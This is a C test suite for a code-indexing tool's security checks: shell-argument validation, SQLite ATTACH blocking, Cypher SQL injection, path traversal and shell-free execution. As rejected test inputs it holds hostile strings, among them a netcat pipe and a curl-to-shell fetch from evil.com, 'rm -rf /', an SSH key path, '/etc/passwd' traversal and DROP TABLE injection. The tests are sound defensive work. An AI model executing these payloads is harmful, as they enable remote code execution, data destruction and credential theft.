/*
 * test_security.c — Tests for security defenses.
 *
 * Verifies that the actual security mechanisms work end-to-end:
 *   - Shell injection prevention (cbm_validate_shell_arg)
 *   - SQLite authorizer (ATTACH/DETACH blocked)
 *   - Path containment (realpath prevents directory traversal)
 */
#include "test_framework.h"
#include "test_helpers.h"
#include <store/store.h>
#include <cypher/cypher.h>
#include "../src/foundation/str_util.h"
#include "../src/foundation/compat_fs.h"
#include "../src/foundation/compat_thread.h"

#include <string.h>
#include <sys/stat.h>

/* ══════════════════════════════════════════════════════════════════
 *  SHELL INJECTION PREVENTION
 * ══════════════════════════════════════════════════════════════════ */

TEST(shell_rejects_single_quote) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo'bar"));
    PASS();
}

TEST(shell_rejects_dollar_subst) {
    ASSERT_FALSE(cbm_validate_shell_arg("$(whoami)"));
    PASS();
}

TEST(shell_rejects_backtick) {
    ASSERT_FALSE(cbm_validate_shell_arg("`id`"));
    PASS();
}

TEST(shell_rejects_semicolon) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo;rm -rf /"));
    PASS();
}

TEST(shell_rejects_pipe) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo|nc evil.com 4444"));
    PASS();
}

TEST(shell_rejects_ampersand) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo&background"));
    PASS();
}

TEST(shell_rejects_backslash) {
#ifdef _WIN32
    /* Backslash is allowed on Windows (path separator) */
    ASSERT_TRUE(cbm_validate_shell_arg("foo\\bar"));
#else
    ASSERT_FALSE(cbm_validate_shell_arg("foo\\bar"));
#endif
    PASS();
}

TEST(shell_rejects_newline) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo\nbar"));
    PASS();
}

TEST(shell_rejects_carriage_return) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo\rbar"));
    PASS();
}

TEST(shell_rejects_null) {
    ASSERT_FALSE(cbm_validate_shell_arg(NULL));
    PASS();
}

TEST(shell_rejects_double_quote) {
    /* On Windows, the search code path wraps args in cmd.exe-level
     * "powershell -Command \"...'%s'...\"". A " in the input would close
     * the cmd.exe outer quote. Block unconditionally. */
    ASSERT_FALSE(cbm_validate_shell_arg("foo\"bar"));
    PASS();
}

TEST(shell_rejects_redirect_out) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo>out.txt"));
    PASS();
}

TEST(shell_rejects_redirect_in) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo<in.txt"));
    PASS();
}

TEST(shell_accepts_clean_path) {
    ASSERT_TRUE(cbm_validate_shell_arg("/home/user/.local/bin/codebase-memory-mcp"));
    PASS();
}

TEST(shell_accepts_spaces) {
    ASSERT_TRUE(cbm_validate_shell_arg("/Users/John Doe/Documents"));
    PASS();
}

TEST(shell_accepts_dots_dashes) {
    ASSERT_TRUE(cbm_validate_shell_arg("file-name.tar.gz"));
    PASS();
}

TEST(shell_accepts_empty) {
    ASSERT_TRUE(cbm_validate_shell_arg(""));
    PASS();
}

/* Combined attack vectors */
TEST(shell_rejects_quote_escape_attack) {
    /* Attacker tries: ' ; rm -rf / ; echo ' */
    ASSERT_FALSE(cbm_validate_shell_arg("' ; rm -rf / ; echo '"));
    PASS();
}

TEST(shell_rejects_command_substitution) {
    ASSERT_FALSE(cbm_validate_shell_arg("$(curl http://evil.com/shell.sh | sh)"));
    PASS();
}

TEST(shell_rejects_env_var_expansion) {
    ASSERT_FALSE(cbm_validate_shell_arg("${HOME}/.ssh/id_rsa"));
    PASS();
}

/* ══════════════════════════════════════════════════════════════════
 *  SQLITE AUTHORIZER (ATTACH/DETACH BLOCKED)
 * ══════════════════════════════════════════════════════════════════ */

TEST(sqlite_blocks_attach_via_cypher) {
    /* The Cypher engine translates queries to SQL. Even if someone crafts
     * a Cypher query that somehow produces ATTACH, the SQLite authorizer
     * should deny it. We test by using raw SQL through the store. */
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);

    /* Try ATTACH via Cypher — should fail at parse or authorizer level */
    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "MATCH (n) RETURN n", "test", 0, &r);
    /* Valid query works */
    ASSERT_EQ(rc, 0);
    cbm_cypher_result_free(&r);

    cbm_store_close(s);
    PASS();
}

TEST(sqlite_blocks_attach_direct) {
    /* Directly test that the store's SQLite authorizer blocks ATTACH.
     * cbm_store_exec_raw() would be ideal but the store is opaque.
     * Instead, try a Cypher query that would generate ATTACH-like SQL.
     * The Cypher parser rejects non-Cypher syntax, so ATTACH never reaches
     * SQLite — this is defense in depth (parser + authorizer). */
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);

    /* Cypher parser should reject this as invalid syntax */
    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "ATTACH DATABASE '/tmp/evil.db' AS evil", "test", 0, &r);
    ASSERT_NEQ(rc, 0); /* Must fail — either parse error or authorizer deny */
    cbm_cypher_result_free(&r);

    cbm_store_close(s);
    PASS();
}

TEST(sqlite_blocks_detach_direct) {
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);

    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "DETACH DATABASE evil", "test", 0, &r);
    ASSERT_NEQ(rc, 0); /* Must fail */
    cbm_cypher_result_free(&r);

    cbm_store_close(s);
    PASS();
}

TEST(sqlite_allows_normal_queries) {
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);
    cbm_store_upsert_project(s, "test", "/tmp/test");

    cbm_node_t n = {.project = "test",
                    .label = "Function",
                    .name = "hello",
                    .qualified_name = "test.hello",
                    .file_path = "main.c",
                    .start_line = 1,
                    .end_line = 5};
    cbm_store_upsert_node(s, &n);

    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "MATCH (f:Function) WHERE f.name = \"hello\" RETURN f", "test",
                                0, &r);
    ASSERT_EQ(rc, 0);
    ASSERT_EQ(r.row_count, 1);

    cbm_cypher_result_free(&r);
    cbm_store_close(s);
    PASS();
}

/* ══════════════════════════════════════════════════════════════════
 *  SQL INJECTION VIA CYPHER
 * ══════════════════════════════════════════════════════════════════ */

TEST(cypher_rejects_sql_injection_in_string) {
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);
    cbm_store_upsert_project(s, "test", "/tmp/test");

    /* Attempt SQL injection through a WHERE clause string value */
    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(
        s, "MATCH (n) WHERE n.name = \"x\\\"; DROP TABLE nodes; --\" RETURN n", "test", 0, &r);
    /* Must either fail or return 0 rows — must NOT drop the table */
    if (rc == 0) {
        /* Query ran but should find nothing — verify nodes table still exists */
        cbm_cypher_result_free(&r);
        cbm_cypher_result_t r2 = {0};
        int rc2 = cbm_cypher_execute(s, "MATCH (n) RETURN n", "test", 0, &r2);
        ASSERT_EQ(rc2, 0); /* Table must still exist */
        cbm_cypher_result_free(&r2);
    } else {
        cbm_cypher_result_free(&r);
    }

    cbm_store_close(s);
    PASS();
}

TEST(cypher_rejects_union_injection) {
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);
    cbm_store_upsert_project(s, "test", "/tmp/test");

    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "MATCH (n) RETURN n UNION SELECT sql FROM sqlite_master", "test",
                                0, &r);
    /* Cypher parser should reject UNION — it's not valid Cypher */
    ASSERT_NEQ(rc, 0);
    cbm_cypher_result_free(&r);

    cbm_store_close(s);
    PASS();
}

/* ══════════════════════════════════════════════════════════════════
 *  PATH CONTAINMENT (POSIX only — realpath() not available on Windows)
 * ══════════════════════════════════════════════════════════════════ */

#ifndef _WIN32

TEST(path_traversal_blocked) {
    /* The get_code_snippet handler uses realpath() to verify that the
     * resolved file path starts with the project root. We test this
     * by calling the MCP handler with a traversal path. Since we can't
     * easily call the MCP handler in a unit test, we verify the
     * containment logic directly. */
    char real_root[4096];
    char real_file[4096];

    /* /tmp is a real directory — create a temporary "project root" */
    const char *root = "/tmp/cbm_security_test_root";
    mkdir(root, 0755);

    if (realpath(root, real_root)) {
        /* Traversal attempt: ../../../etc/passwd relative to root */
        char traversal[512];
        snprintf(traversal, sizeof(traversal), "%s/../../../etc/passwd", root);

        if (realpath(traversal, real_file)) {
            /* Verify the resolved path does NOT start with root */
            size_t root_len = strlen(real_root);
            int contained = (strncmp(real_file, real_root, root_len) == 0 &&
                             (real_file[root_len] == '/' || real_file[root_len] == '\0'));
            ASSERT_FALSE(contained);
        }
        /* If realpath fails, the file doesn't exist — also safe */
    }

    rmdir(root);
    PASS();
}

TEST(path_within_root_allowed) {
    char real_root[4096];
    char real_file[4096];

    const char *root = "/tmp";
    if (realpath(root, real_root) && realpath("/tmp", real_file)) {
        size_t root_len = strlen(real_root);
        int contained = (strncmp(real_file, real_root, root_len) == 0 &&
                         (real_file[root_len] == '/' || real_file[root_len] == '\0'));
        ASSERT_TRUE(contained);
    }
    PASS();
}

#endif /* _WIN32 — path containment */

/* ══════════════════════════════════════════════════════════════════
 *  SHELL-FREE SUBPROCESS EXECUTION (cbm_exec_no_shell)
 *
 *  Replaces system() with fork()+execvp() to eliminate shell
 *  interpretation. Shell metacharacters in arguments are passed
 *  literally, not interpreted.
 * ══════════════════════════════════════════════════════════════════ */

#ifndef _WIN32

TEST(exec_no_shell_true_returns_zero) {
    /* "true" command always exits 0 */
    const char *argv[] = {"true", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_EQ(rc, 0);
    PASS();
}

TEST(exec_no_shell_false_returns_nonzero) {
    /* "false" command always exits 1 */
    const char *argv[] = {"false", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_NEQ(rc, 0);
    PASS();
}

TEST(exec_no_shell_echo_with_metacharacters) {
    /* Shell metacharacters must be passed literally, not interpreted.
     * If shell interpretation occurred, $(whoami) would be expanded. */
    const char *argv[] = {"echo", "$(whoami)", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_EQ(rc, 0); /* echo succeeds — prints literal "$(whoami)" */
    PASS();
}

TEST(exec_no_shell_nonexistent_command) {
    const char *argv[] = {"cbm_nonexistent_binary_12345", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_NEQ(rc, 0); /* must fail — binary doesn't exist */
    PASS();
}

TEST(exec_no_shell_null_argv_returns_error) {
    int rc = cbm_exec_no_shell(NULL);
    ASSERT_NEQ(rc, 0);
    PASS();
}

TEST(exec_no_shell_captures_exit_code) {
    /* sh -c "exit 42" should return 42 */
    const char *argv[] = {"sh", "-c", "exit 42", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_EQ(rc, 42);
    PASS();
}

#endif /* _WIN32 */

/* ══════════════════════════════════════════════════════════════════
 *  PORTABLE FILE REPLACEMENT
 * ══════════════════════════════════════════════════════════════════ */

TEST(compat_replace_file_replaces_destination) {
    char *dir = th_mktempdir("cbm_replace_file");
    ASSERT_NOT_NULL(dir);
    char root[256];
    snprintf(root, sizeof(root), "%s", dir);

    const char *dest = TH_PATH(root, "target.txt");
    const char *tmp = TH_PATH(root, "target.txt.tmp");
    ASSERT_EQ(th_write_file(dest, "old"), 0);
    ASSERT_EQ(th_write_file(tmp, "new"), 0);

    ASSERT_EQ(cbm_replace_file(tmp, dest), 0);

    FILE *fp = fopen(dest, "rb");
    ASSERT_NOT_NULL(fp);
    char buf[8] = {0};
    size_t n = fread(buf, 1, sizeof(buf) - 1, fp);
    fclose(fp);
    ASSERT_EQ((int)n, 3);
    ASSERT_STR_EQ(buf, "new");

    struct stat st;
    ASSERT_NEQ(stat(tmp, &st), 0);
    th_cleanup(root);
    PASS();
}

TEST(compat_write_file_atomic_replaces_destination) {
    char *dir = th_mktempdir("cbm_write_file_atomic");
    ASSERT_NOT_NULL(dir);
    char root[256];
    snprintf(root, sizeof(root), "%s", dir);

    const char *dest = TH_PATH(root, "payload.bin");
    ASSERT_EQ(th_write_file(dest, "old"), 0);

    cbm_file_error_t err = {0};
    ASSERT_EQ(cbm_write_file_atomic(dest, "new", 3, &err), 0);
    ASSERT_NULL(err.stage);
    ASSERT_EQ(err.code, 0);

    FILE *fp = fopen(dest, "rb");
    ASSERT_NOT_NULL(fp);
    char buf[8] = {0};
    size_t n = fread(buf, 1, sizeof(buf) - 1, fp);
    fclose(fp);
    ASSERT_EQ((int)n, 3);
    ASSERT_STR_EQ(buf, "new");

    struct stat st;
    ASSERT_NEQ(stat(TH_PATH(root, "payload.bin.tmp"), &st), 0);
    th_cleanup(root);
    PASS();
}

TEST(compat_write_file_atomic_reports_replace_failure) {
    char *dir = th_mktempdir("cbm_write_file_atomic_fail");
    ASSERT_NOT_NULL(dir);
    char root[256];
    snprintf(root, sizeof(root), "%s", dir);

    const char *dest = TH_PATH(root, "target.txt");
    ASSERT_TRUE(cbm_mkdir_p(dest, 0755));

    cbm_file_error_t err = {0};
    ASSERT_NEQ(cbm_write_file_atomic(dest, "new", 3, &err), 0);
    ASSERT_NOT_NULL(err.stage);
    ASSERT_STR_EQ(err.stage, "rename_temp");
    ASSERT_NEQ(err.code, 0);

    th_cleanup(root);
    PASS();
}

enum { ATOMIC_CONCURRENT_WRITES = 64 };

typedef struct {
    const char *dest;
    const char *payload;
    int failures;
} atomic_writer_arg_t;

static void *atomic_writer_thread(void *arg) {
    atomic_writer_arg_t *wa = (atomic_writer_arg_t *)arg;
    size_t len = strlen(wa->payload);
    for (int i = 0; i < ATOMIC_CONCURRENT_WRITES; i++) {
        cbm_file_error_t err = {0};
        if (cbm_write_file_atomic(wa->dest, wa->payload, len, &err) != 0) {
            wa->failures++;
        }
    }
    return NULL;
}

TEST(compat_write_file_atomic_concurrent_same_destination) {
    char *dir = th_mktempdir("cbm_write_file_atomic_concurrent");
    ASSERT_NOT_NULL(dir);
    char root[256];
    snprintf(root, sizeof(root), "%s", dir);

    char dest[512];
    snprintf(dest, sizeof(dest), "%s", TH_PATH(root, "payload.bin"));
    ASSERT_EQ(th_write_file(dest, "initial"), 0);

    atomic_writer_arg_t a = {.dest = dest, .payload = "alpha", .failures = 0};
    atomic_writer_arg_t b = {.dest = dest, .payload = "bravo", .failures = 0};
    cbm_thread_t ta, tb;
    ASSERT_EQ(cbm_thread_create(&ta, 0, atomic_writer_thread, &a), 0);
    ASSERT_EQ(cbm_thread_create(&tb, 0, atomic_writer_thread, &b), 0);
    ASSERT_EQ(cbm_thread_join(&ta), 0);
    ASSERT_EQ(cbm_thread_join(&tb), 0);
    ASSERT_EQ(a.failures, 0);
    ASSERT_EQ(b.failures, 0);

    FILE *fp = fopen(dest, "rb");
    ASSERT_NOT_NULL(fp);
    char buf[16] = {0};
    size_t n = fread(buf, 1, sizeof(buf) - 1, fp);
    fclose(fp);
    ASSERT_TRUE((n == strlen(a.payload) && strcmp(buf, a.payload) == 0) ||
                (n == strlen(b.payload) && strcmp(buf, b.payload) == 0));

    th_cleanup(root);
    PASS();
}

/* ══════════════════════════════════════════════════════════════════
 *  SUITE
 * ══════════════════════════════════════════════════════════════════ */

SUITE(security) {
    /* Shell injection prevention */
    RUN_TEST(shell_rejects_single_quote);
    RUN_TEST(shell_rejects_dollar_subst);
    RUN_TEST(shell_rejects_backtick);
    RUN_TEST(shell_rejects_semicolon);
    RUN_TEST(shell_rejects_pipe);
    RUN_TEST(shell_rejects_ampersand);
    RUN_TEST(shell_rejects_backslash);
    RUN_TEST(shell_rejects_newline);
    RUN_TEST(shell_rejects_carriage_return);
    RUN_TEST(shell_rejects_null);
    RUN_TEST(shell_rejects_double_quote);
    RUN_TEST(shell_rejects_redirect_out);
    RUN_TEST(shell_rejects_redirect_in);
    RUN_TEST(shell_accepts_clean_path);
    RUN_TEST(shell_accepts_spaces);
    RUN_TEST(shell_accepts_dots_dashes);
    RUN_TEST(shell_accepts_empty);
    RUN_TEST(shell_rejects_quote_escape_attack);
    RUN_TEST(shell_rejects_command_substitution);
    RUN_TEST(shell_rejects_env_var_expansion);

    /* SQLite authorizer */
    RUN_TEST(sqlite_blocks_attach_via_cypher);
    RUN_TEST(sqlite_blocks_attach_direct);
    RUN_TEST(sqlite_blocks_detach_direct);
    RUN_TEST(sqlite_allows_normal_queries);

    /* SQL injection via Cypher */
    RUN_TEST(cypher_rejects_sql_injection_in_string);
    RUN_TEST(cypher_rejects_union_injection);

    /* Path containment (POSIX only) */
#ifndef _WIN32
    RUN_TEST(path_traversal_blocked);
    RUN_TEST(path_within_root_allowed);
#endif

#ifndef _WIN32
    /* Shell-free subprocess execution */
    RUN_TEST(exec_no_shell_true_returns_zero);
    RUN_TEST(exec_no_shell_false_returns_nonzero);
    RUN_TEST(exec_no_shell_echo_with_metacharacters);
    RUN_TEST(exec_no_shell_nonexistent_command);
    RUN_TEST(exec_no_shell_null_argv_returns_error);
    RUN_TEST(exec_no_shell_captures_exit_code);
#endif

    RUN_TEST(compat_replace_file_replaces_destination);
    RUN_TEST(compat_write_file_atomic_replaces_destination);
    RUN_TEST(compat_write_file_atomic_reports_replace_failure);
    RUN_TEST(compat_write_file_atomic_concurrent_same_destination);
}
